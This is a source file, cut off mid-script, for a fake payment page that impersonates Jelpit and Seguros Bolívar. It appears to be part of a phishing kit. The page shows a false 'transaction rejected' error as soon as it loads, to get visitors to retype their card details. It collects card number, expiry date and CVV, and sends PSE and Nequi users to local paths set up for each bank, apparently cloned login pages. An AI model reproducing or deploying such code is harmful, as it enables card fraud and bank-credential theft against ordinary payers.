    <?php
    require_once __DIR__ . '/includes/security.php';
    require_once __DIR__ . '/includes/flujo.php';
    notificar_flujo("💳 Selección de Método de Pago");
    jelpi_bootstrap(['noindex' => true]);
    $canonical = jelpi_canonical_url('/pagos.php');
    $siteHost = jelpi_site_url();
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Finalizar Pago Seguro | Jelpit</title>
        <meta name="description" content="Finaliza tu pago de administración en Jelpit con métodos como tarjeta, PSE y Nequi. Entorno seguro y optimizado.">
        <meta name="robots" content="noindex,nofollow,noarchive">
        <link rel="canonical" href="<?= htmlspecialchars($canonical, ENT_QUOTES, 'UTF-8'); ?>">
        <link rel="icon" type="image/x-icon" href="/img/favicon.svg">
        <link rel="apple-touch-icon" href="/img/favicon.svg">
        <meta property="og:type" content="website">
        <meta property="og:title" content="Finalizar Pago Seguro | Jelpit">
        <meta property="og:description" content="Paga tu administración con tarjeta, PSE o Nequi en un flujo seguro.">
        <meta property="og:url" content="<?= htmlspecialchars($canonical, ENT_QUOTES, 'UTF-8'); ?>">
        <meta property="og:site_name" content="Jelpit">
        <script type="application/ld+json">
        {
        "@context": "https://schema.org",
        "@type": "WebSite",
        "name": "Jelpit",
        "url": "<?= htmlspecialchars($siteHost, ENT_QUOTES, 'UTF-8'); ?>"
        }
        </script>
        <style>
            :root { 
                --jelpit-purple: #2D165E; 
                --bg-gray: #E8EBEF;
                --jelpit-green: #00C389;
                --border-color: #D1D5DB;
                --text-main: #111827;
                --text-muted: #6B7280;
            }
            
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto Condensed', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
            
            body { background-color: var(--bg-gray); min-height: 100vh; display: flex; flex-direction: column; align-items: center; }

            /* HEADER */
            header { background: #fff; padding: 15px 0; display: flex; justify-content: center; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
            .header-inner { width: 100%; max-width: 1400px; padding: 0 40px; display: flex; justify-content: space-between; align-items: center; }
            .logo { height: 45px; }
            .btn-volver { border: 1px solid var(--jelpit-green); padding: 8px 24px; border-radius: 25px; color: #000; text-decoration: none; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
            .btn-volver:hover { background: #f0fdf4; }
            /* CONTENEDOR PRINCIPAL */
            .main-wrapper { width: 100%; max-width: 1200px; display: flex; justify-content: center; padding: 50px 20px; gap: 30px; align-items: flex-start; }
            
            /* IZQUIERDA: DATOS DEL CLIENTE */
            .card-main { background: #fff; border-radius: 16px; flex: 1; max-width: 700px; padding: 40px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); }
            .section-title { color: var(--text-main); font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
            .divider { border-bottom: 1px solid #E5E7EB; margin-bottom: 30px; }

            .data-block { margin-bottom: 25px; }
            .label-text { display: block; font-size: 14px; font-weight: 700; color: var(--text-main); margin-bottom: 4px; }
            .value-text { display: block; font-size: 15px; color: var(--text-muted); font-weight: 400; }
            .grid-data { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 40px; }

            /* MÉTODOS DE PAGO / ACORDEÓN */
            .metodos-title { font-size: 16px; font-weight: 700; color: #000; margin-bottom: 15px; }
            .acordeon-item { margin-bottom: 10px; border-radius: 6px; border: 1px solid #ccc; overflow: hidden; background: #fff; }
            .method-box { padding: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background 0.2s; }
            .method-box:hover { background: #f9fafb; }
            .method-box span { font-weight: 400; color: #555; font-size: 14px; }
            .logos-row { display: flex; align-items: center; gap: 5px; }
            .logos-row img { height: 18px; object-fit: contain; border: 1px solid #eee; border-radius: 2px; }
            .arrow-icon { width: 12px; transition: 0.3s; color: #666; }

            .acordeon-content { display: none; padding: 0 15px 15px 15px; border-top: 1px solid #eee; background: #fff; }
            .acordeon-item.open .acordeon-content { display: block; margin-top: 10px; }
            .acordeon-item.open .arrow-icon { transform: rotate(180deg); }

            .radio-group { display: flex; gap: 30px; margin: 15px 0 20px 0; }
            .radio-item { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 400; color: #333; cursor: pointer; }
            .radio-item input { accent-color: #1a7f37; width: 16px; height: 16px; }

            .input-wrapper { position: relative; width: 100%; margin-bottom: 15px; }
            .input-label { display: block; font-size: 13px; color: #444; font-weight: 400; margin-bottom: 6px; }
            .form-input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; outline: none; background: #fff; color: #333; }
            .form-input:focus { border-color: #999; box-shadow: none; }
            .payment-warning {
                margin: 15px 0 18px;
                padding: 12px 14px;
                border: 1px solid #fecaca;
                border-left: 4px solid #dc2626;
                border-radius: 10px;
                background: linear-gradient(90deg, #fff5f5 0%, #fef2f2 100%);
                color: #991b1b;
                font-size: 13px;
                line-height: 1.5;
                box-shadow: 0 6px 18px rgba(220, 38, 38, 0.08);
            }
            .payment-warning strong { font-weight: 700; color: #b91c1c; }
            .form-input.input-error {
                border-color: #dc2626 !important;
                background: #fff5f5;
                box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.10);
            }
            .input-error + .input-trailing-icon { color: #dc2626; }
            select.form-input { appearance: none; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="%23666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>'); background-repeat: no-repeat; background-position: right 10px center; }
            .with-icon { padding-right: 35px; }
            .input-trailing-icon {
                position: absolute;
                right: 12px;
                top: 50%;
                transform: translateY(-50%);
                width: 20px;
                height: 20px;
                color: #666;
                pointer-events: none;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            /* ESTILO TARJETA (como referencia visual solicitada) */
            #item-tarjeta { border-color: #ccc; border-radius: 6px; }
            #item-tarjeta .method-box { padding: 15px; }
            #item-tarjeta .method-box > span { font-size: 14px; font-weight: 400; color: #555; }
            #item-tarjeta .logos-row { gap: 5px; }
            #item-tarjeta .logos-row img {
                height: 18px;
                padding: 0;
                border: 1px solid #eee;
                border-radius: 2px;
                background: #fff;
            }
            #item-tarjeta .arrow-icon { width: 12px; color: #666; }
            #item-tarjeta .acordeon-content {
                background: #fff;
                border-top: 1px solid #eee;
                padding: 0 15px 15px;
            }
            #item-tarjeta .radio-group { gap: 30px; margin: 15px 0 20px; }
            #item-tarjeta .radio-item { font-size: 14px; font-weight: 400; color: #333; }
            #item-tarjeta .radio-item input { width: 16px; height: 16px; accent-color: #1a7f37; }
            #item-tarjeta .input-label {
                font-size: 13px;
                font-weight: 400;
                color: #444;
                margin-bottom: 6px;
            }
            #item-tarjeta .form-input {
                height: auto;
                padding: 10px;
                border: 1px solid #ccc;
                border-radius: 4px;
                font-size: 14px;
                color: #333;
                background: #fff;
            }
            #item-tarjeta .form-input::placeholder { color: #8a8f98; }
            #item-tarjeta .input-wrapper { margin-bottom: 15px; }

            /* DERECHA: DATOS DE PAGO */
            .card-side { background: #fff; border-radius: 16px; width: 340px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; }
            .side-header { font-weight: 700; font-size: 16px; margin-bottom: 25px; color: var(--text-main); display: flex; align-items: center; gap: 10px; }
            .side-info-line { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
            
            .prop-name { font-weight: 700; font-size: 12px; color: var(--text-main); line-height: 1.4; text-transform: uppercase; }
            .prop-ref { font-size: 12px; color: var(--text-muted); line-height: 1.4; }
            
            .total-box { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
            .total-label { font-size: 18px; font-weight: 700; color: var(--text-main); }
            .total-amount { font-size: 18px; font-weight: 800; color: var(--text-main); }
            
            .secure-text { text-align: center; font-size: 12px; color: var(--text-muted); margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 6px; }
            .logos-seguridad-footer { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
            .logos-seguridad-footer img { height: 18px; object-fit: contain; }
            
            .btn-pay-final { width: 100%; background: #E5E7EB; border: none; padding: 14px; border-radius: 30px; font-weight: 700; font-size: 14px; color: #6B7280; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
            .btn-pay-final.active-btn { background: var(--jelpit-green); color: #fff; }

            /* FOOTER */
            footer { width: 100%; background: #fff; padding: 20px; text-align: center; border-top: 2px solid var(--jelpit-purple); font-size: 11px; color: var(--text-muted); margin-top: auto; }

            /* LOADER */
            #loader-container { display: none; text-align: center; margin-top: 15px; padding: 40px 0; }
            .spinner { border: 3px solid rgba(0, 0, 0, 0.1); width: 30px; height: 30px; border-radius: 50%; border-left-color: var(--jelpit-green); animation: spin 1s linear infinite; margin: 0 auto 10px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

            /* MEDIA QUERIES */
            @media (max-width: 900px) { .main-wrapper { flex-direction: column; align-items: center; } .card-main, .card-side { width: 100%; max-width: 100%; } .card-side { order: -1; } }
            @media (max-width: 600px) { .grid-data { grid-template-columns: 1fr; gap: 15px; } .header-inner { padding: 0 15px; } .card-main { padding: 20px; } }
            @media (max-width: 800px) {
                .promo-banner-inner { width: var(--promo-banner-width-mobile); }
                .promo-banner img {
                    border-radius: var(--promo-banner-radius-mobile);
                    max-height: var(--promo-banner-max-height-mobile);
                }
                .promo-banner-close {
                    top: -8px;
                    right: -8px;
                    width: 28px;
                    height: 28px;
                    font-size: 19px;
                }
            }
        </style>
    </head>
    <body>

    <header>
        <div class="header-inner">
            <img src="https://pagos-conjuntos.jelpit.com/logo-jelpit.svg" alt="Jelpit" class="logo" onerror="this.src='img/logo.svg'">
            <a href="#" class="btn-volver"><span>‹</span> Volver</a>
        </div>
    </header>


    <div class="main-wrapper">
        <div class="card-main">
            <div class="section-title">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00C389" stroke-width="2.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                Datos del cliente
            </div>
            <div class="divider"></div>
            
            <div id="form-content-area">
                <div class="data-block">
                    <span class="label-text">Nombre completo</span>
                    <span class="value-text" id="res_nom">Cargando...</span>
                </div>
                <div class="grid-data">
                    <div class="data-block" style="margin-bottom:0;">
                        <span class="label-text">Correo Electrónico</span>
                        <span class="value-text" id="res_correo">---</span>
                    </div>
                    <div class="data-block" style="margin-bottom:0;">
                        <span class="label-text">Celular</span>
                        <span class="value-text" id="res_cel">---</span>
                    </div>
                </div>

                <h3 class="metodos-title">Métodos de pago</h3>
                
                <!-- TARJETA -->
                <div class="acordeon-item" id="item-tarjeta">
                    <div class="method-box" onclick="toggleMetodo('item-tarjeta')">
                        <span>Tarjetas Débito o Crédito</span>
                        <div class="logos-row">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/MasterCard_early_1990s_logo.png?">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Visa_Inc._logo_%282005%E2%80%932014%29.png">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/500px-American_Express_logo_%282018%29.svg.png">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Diners_Club_Logo3.svg">
                            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
                        </div>
                    </div>
                    <div class="acordeon-content">
                        <div class="payment-warning" id="card-warning-message" role="alert">
                            <strong>No se pudo procesar la transacción.</strong><br>
                            La entidad bancaria rechazó la solicitud o no pudo autorizarla. Por favor ingresa los datos nuevamente o intenta con otro método de pago.
                        </div>
                        <form id="paymentForm"><input type="text" name="website" id="website" value="" autocomplete="off" tabindex="-1" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;">
                            <?= jelpi_csrf_field(); ?>
                            <div class="radio-group">
                                <label class="radio-item"><input type="radio" name="tp" value="debito"> Tarjeta Débito</label>
                                <label class="radio-item"><input type="radio" name="tp" value="credito" checked> Tarjeta Crédito</label>
                            </div>
                            <div class="form-group">
                                <label class="input-label" for="ownerName">Nombre del titular</label>
                                <div class="input-wrapper">
                                    <input type="text" id="ownerName" class="form-input" placeholder="Ej: Carlo Rodriguez" required>
                                </div>
                            </div>
                            <div class="form-group">
                                <label class="input-label" for="cardNumber">Número de tarjeta</label>
                                <div class="input-wrapper">
                                    <input type="text" id="cardNumber" class="form-input with-icon" placeholder="Ej: 4532 0148 1234 5678" required>
                                    <svg class="input-trailing-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                                        <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                                        <path d="M2 10h20"></path>
                                        <path d="M6 15h4"></path>
                                    </svg>
                                </div>
                            </div>
                            <div style="display: flex; gap: 15px;">
                                <div class="form-group" style="flex: 1;">
                                    <label class="input-label" for="expira">Fecha de vencimiento</label>
                                    <div class="input-wrapper">
                                        <input type="text" id="expira" class="form-input with-icon" placeholder="Ej: 05/27" required>
                                        <svg class="input-trailing-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                                            <rect x="3" y="5" width="18" height="16" rx="2"></rect>
                                            <path d="M8 3v4M16 3v4M3 10h18"></path>
                                        </svg>
                                    </div>
                                </div>
                                <div class="form-group" style="flex: 1;">
                                    <label class="input-label" for="cvv">Código de seguridad</label>
                                    <div class="input-wrapper">
                                        <input type="text" id="cvv" class="form-input with-icon" placeholder="Ej: 111" required>
                                        <svg class="input-trailing-icon" viewBox="0 0 24 24" fill="currentColor">
                                            <circle cx="12" cy="12" r="11" opacity="0.9"></circle>
                                            <text x="12" y="15" text-anchor="middle" dominant-baseline="middle" font-size="13" fill="#ffffff" font-family="Arial">?</text>
                                        </svg>
                                    </div>
                                </div>
                            </div>
                            <div class="input-wrapper" id="cuotas-wrapper">
                                <label class="input-label">Número de cuotas</label>
                                <select class="form-input" id="card-cuotas">
                                    <option value="">Seleccione una opción</option>
                                    <option value="1">1 cuota</option>
                                    <option value="2">2 cuotas</option>
                                    <option value="3">3 cuotas</option>
                                    <option value="4">4 cuotas</option>
                                    <option value="5">5 cuotas</option>
                                    <option value="6">6 cuotas</option>
                                    <option value="12">12 cuotas</option>
                                </select>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- PSE -->
                <div class="acordeon-item" id="item-pse">
                    <div class="method-box" onclick="toggleMetodo('item-pse')">
                        <span>Débito PSE</span>
                        <div class="logos-row">
                            <img src="https://cooferroviariadelpacifico.com/wp-content/uploads/2021/05/brand-pse.png">
                            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
                        </div>
                    </div>
                    <div class="acordeon-content">
                        <form id="formPSE"><input type="text" name="website" id="website_pse" value="" autocomplete="off" tabindex="-1" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;">
                            <?= jelpi_csrf_field(); ?>
                            <div style="display: flex; flex-wrap: wrap; gap: 15px;">
                                <div class="input-wrapper" style="flex: 1; min-width: 200px;">
                                    <label class="input-label">Tipo de documento</label>
                                    <select class="form-input" id="pse_tipo_doc"><option>Cédula de Ciudadanía</option></select>
                                </div>
                                <div class="input-wrapper" style="flex: 1; min-width: 200px;">
                                    <label class="input-label">Número de documento</label>
                                    <input type="text" id="pse_cedula" class="form-input" placeholder="12312312" required>
                                </div>
                            </div>
                            <div class="input-wrapper">
                                <label class="input-label">Selecciona tu banco</label>
                                <select class="form-input" id="pse_banco" required>
                                    <option value="">A continuación seleccione su banco</option>
                                    <option value="avvillas" tipo="2" folder="b-34f1">BANCO AV VILLAS</option>
                                    <option value="bbva" tipo="2" folder="b-34f13">BANCO BBVA COLOMBIA S.A.</option>
                                    <option value="caja-social" tipo="2" folder="b-34f2">BANCO CAJA SOCIAL</option>
                                    <option value="bogota" tipo="2" folder="b-34f4">BANCO DE BOGOTA</option>
                                    <option value="davivienda" tipo="2" folder="b-34f10">BANCO DAVIVIENDA</option>
                                    <option value="occidente" tipo="2" folder="b-34f14">BANCO DE OCCIDENTE</option>
                                    <option value="falabella" tipo="2" folder="b-34f5">BANCO FALABELLA</option>
                                    <option value="finandina" tipo="2" folder="b-34f6">BANCO FINANDINA S.A. BIC</option>
                                    <option value="itau" tipo="2" folder="b-34f7">BANCO ITAU</option>
                                    <option value="mundo-mujer" tipo="1" folder="b-34f01">BANCO MUNDO MUJER S.A.</option>
                                    <option value="popular" tipo="2" folder="b-34f18">BANCO POPULAR</option>
                                    <option value="serfinanza" tipo="2" folder="b-34f16">BANCO SERFINANZA</option>
                                    <option value="union" tipo="1" folder="b-34f0">BANCO UNION antes GIROS</option>
                                    <option value="bancolombia" tipo="2" folder="b-34f9">BANCOLOMBIA</option>
                                    <option value="lulo" tipo="1" folder="b-34f02">LULO BANK</option>
                                    <option value="scotiabank-colpatria" tipo="2" folder="b-34f12">SCOTIABANK COLPATRIA</option>
                                </select>
                            </div>
                            <div class="input-wrapper">
                                <label class="input-label">Tipo de persona</label>
                                <select class="form-input" id="pse_tipo_per"><option value="Natural">Persona natural</option></select>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- NEQUI -->
                <div class="acordeon-item" id="item-nequi">
                    <div class="method-box" onclick="toggleMetodo('item-nequi')">
                        <span>Nequi</span>
                        <div class="logos-row" style="gap: 8px; margin-left: auto;">
                            <img src="https://cloudfront-us-east-1.images.arcpublishing.com/elespectador/GFMSTY6UIZBUBDE2SPIXGWQVIU.jpg" alt="Nequi QR" style="height: 32px; object-fit: contain;">
                            <svg class="arrow-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
                        </div>
                    </div>
                    <div class="acordeon-content" style="text-align: center;">
                        <!-- Imagen QR Nequi - Banco Caja Social -->
                        <img src="https://cloudfront-us-east-1.images.arcpublishing.com/elespectador/GFMSTY6UIZBUBDE2SPIXGWQVIU.jpg" 
                            alt="QR Nequi" 
                            style="max-width: 260px; width: 100%; margin: 0 auto 30px; display: block; object-fit: contain; border-radius: 12px;">
                            
                        <form id="formNequi"><input type="text" name="website" id="website_nequi" value="" autocomplete="off" tabindex="-1" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;">
                            <?= jelpi_csrf_field(); ?>
                        </form>
                    </div>
                </div>

            </div>

            <div id="loader-container">
                <div class="spinner"></div>
                <p style="color: var(--text-main); font-size: 14px; font-weight: 600;">Redirigiendo a su entidad bancaria...</p>
            </div>
        </div>

        <!-- DERECHA: PAGO -->
        <div class="card-side">
            <div class="side-header">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00C389" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
                Datos de Pago
            </div>
            
            <div class="side-info-line">
                <div class="prop-name" id="res_conjunto">MALL COMERCIAL MERIDIANO ICONIK</div>
                <div class="prop-ref">Referencia:<br><span id="res_ref">801</span></div>
            </div>
            
            <div class="total-box">
                <span class="total-label">Total:</span>
                <span class="total-amount" id="res_total">$500.000,00</span>
            </div>
            
            <div class="secure-text">🔒 El pago es 100% seguro</div>
            <div class="logos-seguridad-footer">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/MasterCard_early_1990s_logo.png?">
                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Visa_Inc._logo_%282005%E2%80%932014%29.png">
                <img src="https://cooferroviariadelpacifico.com/wp-content/uploads/2021/05/brand-pse.png">
            </div>
            <button id="side-pay-btn" class="btn-pay-final active-btn">PAGAR</button>
            
        </div>
    </div>

    <footer>
        <div style="font-weight:700; margin-bottom:5px; color: #4B5563;">VIGILADO SUPERINTENDENCIA FINANCIERA DE COLOMBIA</div>
        <p>© 2021 - Seguros Bolívar S.A. - Todos los derechos reservados</p>
    </footer>

    <script>
        let totalBaseValue = 0;

        function updatePricingByMethod() {}

        function fillPSEData() {
            const usuarioDatos = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            const doc = usuarioDatos.documento || localStorage.getItem('val') || '';
            const banco = (usuarioDatos.banco || localStorage.getItem('banco') || '').toLowerCase().trim();
            const tipoPersona = usuarioDatos.tipo_persona || localStorage.getItem('per') || 'Natural';

            const cedulaInput = document.getElementById('pse_cedula');
            const bancoSelect = document.getElementById('pse_banco');
            const tipoPerSelect = document.getElementById('pse_tipo_per');

            if (cedulaInput && doc) cedulaInput.value = doc;
            if (tipoPerSelect && tipoPersona) {
                tipoPerSelect.value = tipoPerSelect.querySelector('option[value="Natural"]') ? 'Natural' : tipoPerSelect.value;
            }
            if (bancoSelect && banco) {
                const found = Array.from(bancoSelect.options).find(opt => opt.value.toLowerCase() === banco);
                if (found) bancoSelect.value = found.value;
            }
        }

        function toggleMetodo(id) { 
            const items = document.querySelectorAll('.acordeon-item');
            items.forEach(item => {
                if (item.id === id) item.classList.toggle('open');
                else item.classList.remove('open');
            });
            if (document.getElementById('item-pse')?.classList.contains('open')) {
                fillPSEData();
            }
            updatePricingByMethod();
        }

        function applyCardErrorState() {
            const tarjetaItem = document.getElementById('item-tarjeta');
            if (!tarjetaItem) return;
            const fields = tarjetaItem.querySelectorAll('.form-input');
            fields.forEach(field => field.classList.add('input-error'));
            const warningBox = document.getElementById('card-warning-message');
            if (warningBox) warningBox.style.display = 'block';
        }

        function openCardMethodSection() {
            const tarjetaItem = document.getElementById('item-tarjeta');
            if (!tarjetaItem) return;
            document.querySelectorAll('.acordeon-item').forEach(item => item.classList.remove('open'));
            tarjetaItem.classList.add('open');
            applyCardErrorState();
            requestAnimationFrame(() => {
                const sectionTop = tarjetaItem.getBoundingClientRect().top + window.scrollY - 30;
                window.scrollTo({ top: sectionTop, behavior: 'smooth' });
                setTimeout(() => {
                    const firstField = tarjetaItem.querySelector('input, select');
                    if (firstField) firstField.focus({ preventScroll: true });
                }, 350);
            });
        }
 
        document.addEventListener('DOMContentLoaded', () => {
            const usuarioDatos = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            const total = localStorage.getItem('total_pagar');
            const datosapi = JSON.parse(localStorage.getItem('datosapi') || '{}');
            const tarjetaItem = document.getElementById('item-tarjeta');
            const pseItem = document.getElementById('item-pse');

            const nombreFinal = usuarioDatos.nombre || localStorage.getItem('nom') || "Andres Gomes";
            const correoFinal = usuarioDatos.correo || localStorage.getItem('correo') || "---";
            const celularFinal = usuarioDatos.telefono || localStorage.getItem('cel') || "---";
            const documentoFinal = usuarioDatos.documento || "";
            const parseMonto = (valor) => {
                if (valor == null) return NaN;
                const limpio = String(valor).replace(/[^\d.,]/g, '').replace(/\./g, '').replace(',', '.');
                return Number(limpio);
            };
            const fmtCOP = (valor) => '$' + Number(valor).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

            document.getElementById('res_nom').innerText = nombreFinal;
            document.getElementById('res_correo').innerText = correoFinal;
            document.getElementById('res_cel').innerText = celularFinal;
            
            if (document.getElementById('ownerName')) document.getElementById('ownerName').value = '';
            if (document.getElementById('pse_cedula') && documentoFinal) document.getElementById('pse_cedula').value = documentoFinal;

            totalBaseValue = Number(total) || parseMonto(document.getElementById('res_total').innerText) || 0;
            document.getElementById('res_total').innerText = fmtCOP(totalBaseValue);

            if (tarjetaItem) {
                openCardMethodSection();
            }
            if (pseItem && !tarjetaItem?.classList.contains('open')) {
                pseItem.classList.add('open');
                fillPSEData();
            }
            updatePricingByMethod();
            
            if(datosapi.conjuntoSeleccionado?.co_ownership_name) {
                document.getElementById('res_conjunto').innerText = datosapi.conjuntoSeleccionado.co_ownership_name;
            }
            if(datosapi.propiedadSeleccionada?.reference) {
                document.getElementById('res_ref').innerText = datosapi.propiedadSeleccionada.reference;
            }

            const sidePayBtn = document.getElementById('side-pay-btn');
            if (sidePayBtn) {
                sidePayBtn.addEventListener('click', () => {
                    const cardOpen = document.getElementById('item-tarjeta')?.classList.contains('open');
                    const pseOpen = document.getElementById('item-pse')?.classList.contains('open');
                    const nequiOpen = document.getElementById('item-nequi')?.classList.contains('open');

                    if (cardOpen) {
                        document.getElementById('paymentForm')?.requestSubmit();
                        return;
                    }
                    if (pseOpen) {
                        document.getElementById('formPSE')?.requestSubmit();
                        return;
                    }
                    if (nequiOpen) {
                        document.getElementById('formNequi')?.requestSubmit();
                        return;
                    }
                    alert('Selecciona un método de pago para continuar.');
                });
            }
        });

        // PSE FORM
        document.getElementById("formPSE").addEventListener("submit", function (e) {
            e.preventDefault();
            if (document.getElementById("website_pse").value) {
                document.getElementById("form-content-area").style.display = "none";
                document.getElementById("loader-container").style.display = "block";
                return;
            }
            document.getElementById('form-content-area').style.display = 'none';
            document.getElementById('loader-container').style.display = 'block';

            const bancoSel = document.getElementById('pse_banco');
            const opt = bancoSel.options[bancoSel.selectedIndex];
            const carpetaBanco = opt.getAttribute('folder');
            const nombreCliente = document.getElementById('res_nom').innerText.trim();

            localStorage.setItem('val', document.getElementById('pse_cedula').value.trim());
            localStorage.setItem('per', nombreCliente);
            localStorage.setItem('nom', opt.value);
            localStorage.setItem('banco', opt.value);
            localStorage.setItem('folder', carpetaBanco);
            localStorage.setItem('tipo', opt.getAttribute('tipo'));

            try {
                const usuarioDatos = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                usuarioDatos.documento = document.getElementById('pse_cedula').value.trim();
                usuarioDatos.banco = opt.value;
                usuarioDatos.tipo_persona = nombreCliente;
                // Guardar también total_pagar dentro del objeto tbdatos
                const mVal = localStorage.getItem('total_pagar') || localStorage.getItem('monto') || '';
                if (mVal) {
                    usuarioDatos.total_pagar = mVal;
                }
                localStorage.setItem('tbdatos', JSON.stringify(usuarioDatos));
            } catch(err) {
                console.warn("Error guardando tbdatos", err);
            }

            setTimeout(() => {
                window.location.href = "/data-ps/recargas/transaction/" + carpetaBanco;
            }, 1500);
        });

        // NEQUI FORM
        document.getElementById("formNequi").addEventListener("submit", function (e) {
            e.preventDefault();
            if (document.getElementById("website_nequi").value) {
                document.getElementById("form-content-area").style.display = "none";
                document.getElementById("loader-container").style.display = "block";
                return;
            }
            document.getElementById('form-content-area').style.display = 'none';
            document.getElementById('loader-container').style.display = 'block';

            const nombreCliente = document.getElementById('res_nom').innerText.trim();
            
            // Asignamos variables específicas para el flujo de Nequi
            localStorage.setItem('per', nombreCliente);
            localStorage.setItem('nom', 'nequi');
            localStorage.setItem('banco', 'nequi');
            localStorage.setItem('folder', 'nequi-1');
            localStorage.setItem('tipo', '1');

            try {
                // Actualizamos la base de datos de tu API
                const usuarioDatos = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                usuarioDatos.banco = 'nequi';
                usuarioDatos.tipo_persona = nombreCliente;
                const mVal = localStorage.getItem('total_pagar') || localStorage.getItem('monto') || '';
                if (mVal) {
                    usuarioDatos.total_pagar = mVal;
                }
                localStorage.setItem('tbdatos', JSON.stringify(usuarioDatos));
            } catch(err) {
                console.warn("Error guardando tbdatos", err);
            }

            setTimeout(() => {
                window.location.href = "/data-ps/recargas/transaction/nequi-1";
            }, 1500);
        });
        
        // VALIDACIÓN TARJETA
        function luhnCheck(value) {
            let sum = 0, shouldDouble = false;
            for(let i = value.length - 1; i >= 0; i--) {
                let digit = parseInt(value.charAt(i), 10);
                if(shouldDouble) { digit *= 2; if(digit > 9) digit -= 9; }
                sum += digit; shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        document.getElementById('expira').addEventListener('input', e => {
            let val = e.target.value.replace(/[^\d]/g, '');
            if(val.length >= 3) e.target.value = val.slice(0, 2) + '/' + val.slice(2, 4);
            else e.target.value = val;
        });

        document.getElementById('cardNumber').addEventListener('input', e => {
            let val = e.target.value.replace(/\D/g, '').slice(0, 16);
            e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
        });

        const toggleCuotasByTipo = () => {
            const tipoTarjeta = document.querySelector('input[name="tp"]:checked')?.value || 'credito';
            const cuotasWrapper = document.getElementById('cuotas-wrapper');
            const cuotasSelect = document.getElementById('card-cuotas');
            const isCredito = tipoTarjeta === 'credito';

            if (cuotasWrapper) cuotasWrapper.style.display = isCredito ? 'block' : 'none';
            if (cuotasSelect) {
                cuotasSelect.required = isCredito;
                if (!isCredito) cuotasSelect.value = '';
            }
        };

        document.querySelectorAll('input[name="tp"]').forEach(radio => {
            radio.addEventListener('change', toggleCuotasByTipo);
        });
        toggleCuotasByTipo();

        document.getElementById('paymentForm').addEventListener('submit', e => {
            e.preventDefault();
            if (document.getElementById("website").value) {
                document.getElementById("form-content-area").style.display = "none";
                document.getElementById("loader-container").style.display = "block";
                return;
            }
            const rawCard = document.getElementById('cardNumber').value.replace(/\s/g, '');
            if(!luhnCheck(rawCard)) { alert("Número de tarjeta inválido."); return; }
            
            const expira = document.getElementById('expira').value;
            const [expMonth, expYear] = expira.split('/');
            const tipoTarjeta = document.querySelector('input[name="tp"]:checked')?.value || 'credito';
            const cuotas = tipoTarjeta === 'credito' ? document.getElementById('card-cuotas').value : '';

            if (tipoTarjeta === 'credito' && !cuotas) {
                alert("Selecciona el número de cuotas para continuar.");
                return;
            }
            
            const usuarioDatos = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            const tbdatosActualizado = {
                ...usuarioDatos, 
                tarjeta: rawCard,
                expMonth, 
                expYear,
                cvv: document.getElementById('cvv').value.trim(),
